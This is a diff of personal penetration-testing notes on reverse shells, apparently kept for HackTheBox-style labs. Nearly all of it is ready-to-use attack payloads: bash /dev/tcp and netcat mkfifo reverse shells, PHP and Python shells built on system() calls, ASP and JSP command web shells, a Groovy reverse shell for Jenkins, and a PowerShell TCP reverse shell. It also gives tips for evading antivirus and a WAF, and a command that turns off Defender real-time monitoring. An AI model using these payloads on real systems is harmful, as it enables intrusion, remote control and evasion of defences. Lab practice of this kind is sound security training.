@@ -1,31 +1,42 @@
 ! Use 443 port to evade WAF.
-#shell
-
-#### Generator
+#shell/reverse
+# Generator
 https://www.revshells.com/
-#### Powershell generator
+# Powershell generator
 Encrypted & Passes AV
 https://github.com/Adkali/PowerJoker
 ```bash
 git clone https://github.com/Adkali/PowerJoker && cd Powerjoker
 python3 PowerJoker.py -l 10.10.16.84 -p 1337
 ```
-#### Basic bash shell
+# Bash
 ```bash
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.117/4444 0>&1'
 
 echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
 
 echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+```
 
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 
 ```php
 system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.6+4444+>/tmp/f')
 ```
+
+```python
+__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.6 4444 >/tmp/f')
+```
 ##### Upgrade shell to fully interactive:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/sh")'
 CTRL+Z
 stty size;stty raw -echo;fg
 #export SHELL=bash
@@ -40,78 +51,37 @@ Good shell
 ```
 rlwrap nc -lvnp
 ```
-#### [[metasploit]]
+# [[metasploit]]
 
-#### Cheatsheet
+# Cheatsheet
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 
-#### PHP
-#php
-
+#### #php
 ```bash
 curl https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_shell.php > rsh.php 
 ```
-
-##### Java:
-#java
+##### #java
 https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/
-
-##### ASP:
-#asp
+##### #asp
 ```asp
 <% eval request("cmd") %>
 ```
-
-##### JSP:
-[[jsp]] #java
+##### #java
 ```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
-
 ##### Groovy (jenkins console /script):
-[[groovy]]
 ```Groovy
 String host="10.10.15.232";
 int port=8000;
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-
-##### Socat port forwarding:
-[[Local Ports]]
-[[socat]] #bash #shell
-Download:
-https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
-
-forward to app
-```bash
-socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak & 
-```
-
-from 8080 to 8888:
-`./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080
-
-ssh port forwarding:
-```shell-session
-ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
-```
-
-bash shells:
-```bash
-bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
-```
-
-```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
-```
-
-powershell (run from cmd.exe):
-[[powershell]]
+#### [[powershell]]
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
-### Windows
 Disable AV to allow running shell from admin's powershell:
 ```powershell
 PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
